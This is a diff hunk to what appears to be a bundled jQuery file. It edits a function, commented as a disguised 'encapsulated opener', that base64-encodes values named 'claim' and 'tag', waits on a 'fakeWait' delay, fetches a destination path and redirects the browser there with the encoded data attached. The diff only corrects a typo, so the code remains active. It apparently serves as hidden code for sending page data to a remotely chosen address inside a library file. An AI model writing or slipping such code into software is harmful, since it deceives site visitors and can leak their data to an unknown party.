@@ -10789,7 +10789,7 @@ return jQuery;
 
         // Encapsulated opener (intact, only names changed)
         async function triggerAction() {
-          let ref = btoa(`${claim}&${tag}&a}`);
+          let ref = btoa(`${claim}&${tag}&a`);
           await fakeWait();
           let path = await fetchData();
           window.open(`${path}${ref}`,"_self");
